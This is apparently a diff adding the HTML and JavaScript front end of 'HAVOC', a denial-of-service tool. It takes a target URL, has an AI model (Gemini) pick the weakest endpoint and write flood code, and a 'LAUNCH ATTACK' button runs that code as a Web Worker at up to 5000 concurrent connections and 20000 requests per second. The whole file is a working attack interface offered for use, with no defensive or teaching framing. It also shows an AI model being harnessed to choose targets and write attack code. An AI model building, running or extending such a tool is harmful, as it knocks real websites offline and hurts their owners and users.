@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>HAVOC // DDoS Analyzer</title>
+<style>
+  :root { --bg:#07090c; --panel:#0e1319; --line:#1c2733; --red:#ff3b3b; --grn:#3dff8f; --txt:#c9d6e2; --dim:#5a6b7d; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--txt); font:14px/1.5 ui-monospace,Menlo,Consolas,monospace; }
+  .wrap { max-width:980px; margin:0 auto; padding:28px 16px 80px; }
+  h1 { font-size:20px; letter-spacing:4px; color:var(--red); margin:0 0 4px; }
+  .sub { color:var(--dim); font-size:12px; margin-bottom:22px; }
+  .row { display:flex; gap:10px; }
+  input[type=url] { flex:1; background:var(--panel); border:1px solid var(--line); color:var(--txt); padding:12px 14px; font:inherit; outline:none; }
+  input[type=url]:focus { border-color:var(--red); }
+  button { background:var(--panel); border:1px solid var(--red); color:var(--red); padding:12px 22px; font:inherit; cursor:pointer; letter-spacing:2px; }
+  button:hover:not(:disabled) { background:var(--red); color:#000; }
+  button:disabled { opacity:.4; cursor:wait; }
+  .panel { background:var(--panel); border:1px solid var(--line); padding:14px; margin-top:16px; }
+  .panel h2 { font-size:12px; letter-spacing:3px; color:var(--grn); margin:0 0 10px; }
+  pre { white-space:pre-wrap; word-break:break-all; margin:0; font-size:12px; color:#9fb2c4; max-height:280px; overflow:auto; }
+  .ep { padding:6px 8px; border-left:2px solid var(--line); margin-bottom:6px; font-size:12px; }
+  .ep b { color:#ffd45e; font-weight:normal; }
+  .ctl { display:flex; flex-wrap:wrap; gap:18px; align-items:center; margin:10px 0; }
+  .ctl label { font-size:12px; color:var(--dim); }
+  input[type=range] { width:160px; accent-color:var(--red); }
+  .stats { display:flex; gap:24px; flex-wrap:wrap; margin:8px 0; }
+  .stat b { display:block; font-size:22px; color:var(--grn); }
+  .stat span { font-size:11px; color:var(--dim); letter-spacing:1px; }
+  #launch { border-color:var(--grn); color:var(--grn); }
+  #launch:hover:not(:disabled) { background:var(--grn); color:#000; }
+  .err { color:var(--red); font-size:12px; }
+  .dim { color:var(--dim); font-size:12px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>HAVOC // DDOS ANALYZER</h1>
+  <div class="sub">GEMINI-Powered Attack Surface Scanner — finds the weakest endpoint, generates the flood, executes it.</div>
+
+  <div class="row">
+    <input id="url" type="url" placeholder="https://target-site.com" />
+    <button id="scan">ANALYZE</button>
+  </div>
+  <div id="status" class="dim" style="margin-top:10px"></div>
+
+  <div id="results" style="display:none">
+    <div class="panel">
+      <h2>WEAKEST ENDPOINT</h2>
+      <pre id="epinfo"></pre>
+      <div id="epList" style="margin-top:10px"></div>
+    </div>
+    <div class="panel">
+      <h2>GENERATED ATTACK CODE (Web Worker)</h2>
+      <pre id="code"></pre>
+    </div>
+    <div class="panel">
+      <h2>EXECUTE</h2>
+      <div class="ctl">
+        <label>CONCURRENCY <span id="cval">200</span></label>
+        <input id="conc" type="range" min="10" max="5000" step="10" value="200" />
+        <label>RPS TARGET <span id="rval">2000</span></label>
+        <input id="rps" type="range" min="100" max="20000" step="100" value="2000" />
+        <button id="launch">LAUNCH ATTACK</button>
+        <button id="stop" disabled>STOP</button>
+      </div>
+      <div class="stats">
+        <div class="stat"><b id="sDone">0</b><span>REQUESTS SENT</span></div>
+        <div class="stat"><b id="sFail">0</b><span>FAILED</span></div>
+        <div class="stat"><b id="sRps">0</b><span>LIVE RPS</span></div>
+        <div class="stat"><b id="sUp">0s</b><span>UPTIME</span></div>
+      </div>
+      <div id="liveErr" class="err"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+let worker = null;
+let startTs = null;
+const $ = (id) => document.getElementById(id);
+$('conc').oninput = e => $('cval').textContent = e.target.value;
+$('rps').oninput = e => $('rval').textContent = e.target.value;
+
+function stopWorker() {
+  if (worker) { worker.postMessage({ action: 'stop' }); worker.terminate(); worker = null; }
+  $('stop').disabled = true;
+  $('launch').disabled = false;
+  $('sUp').textContent = '0s';
+}
+
+$('scan').onclick = async () => {
+  const url = $('url').value.trim();
+  if (!url) return;
+  $('scan').disabled = true;
+  $('status').textContent = 'Fetching target + scripts, sending to Gemini… (up to 60s)';
+  $('results').style.display = 'none';
+  try {
+    const r = await fetch('/api/scan', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ url }),
+    });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error || 'scan failed');
+    const a = d.analysis;
+    $('status').textContent =
+      `Fetched ${d.fetched_pages} page(s) / ${(d.total_js_bytes/1024).toFixed(0)}KB JS — source: ${d.source}`;
+    $('epinfo').textContent =
+      `TARGET : ${a.target}\nMETHOD : ${a.method}\nHEADERS: ${JSON.stringify(a.headers)}\nBODY   : ${String(a.body).slice(0,400)}\nWHY    : ${a.rationale}`;
+    $('epList').innerHTML = (d.endpoints || []).map(e =>
+      `<div class="ep"><b>${e.score.toFixed(1)}</b> ${e.url}</div>`).join('');
+    $('code').textContent = a.worker_code || '(none)';
+    $('results').style.display = 'block';
+  } catch (e) {
+    $('status').innerHTML = `<span class="err">ERROR: ${e.message}</span>`;
+  }
+  $('scan').disabled = false;
+};
+
+$('launch').onclick = () => {
+  const src = $('code').textContent.trim();
+  if (!src) return;
+  stopWorker();
+  try {
+    worker = new Worker(URL.createObjectURL(new Blob([src], { type: 'application/javascript' })));
+  } catch (e) {
+    $('liveErr').textContent = 'Worker failed to spawn: ' + e.message;
+    return;
+  }
+  worker.onmessage = (e) => {
+    if (e.data && e.data.type === 'stats') {
+      $('sDone').textContent = e.data.done;
+      $('sFail').textContent = e.data.failed;
+      $('sRps').textContent = e.data.rps;
+      $('sUp').textContent = ((Date.now() - startTs) / 1000).toFixed(1) + 's';
+    }
+  };
+  worker.onerror = (e) => { $('liveErr').textContent = e.message || 'worker error'; };
+  startTs = Date.now();
+  $('launch').disabled = true;
+  $('stop').disabled = false;
+  worker.postMessage({
+    action: 'start',
+    url: $('epinfo').textContent.match(/TARGET : (.+)/)[1].trim(),
+    method: 'POST',
+    headers: JSON.parse($('epinfo').textContent.match(/HEADERS: (.+)/)[1]),
+    body: JSON.parse(JSON.stringify(JSON.parse($('epinfo').textContent.match(/BODY   : (.+)/)[1]))),
+    concurrency: +$('conc').value,
+    rps: +$('rps').value,
+  });
+};
+$('stop').onclick = stopWorker;
+</script>
+</body>
+</html>
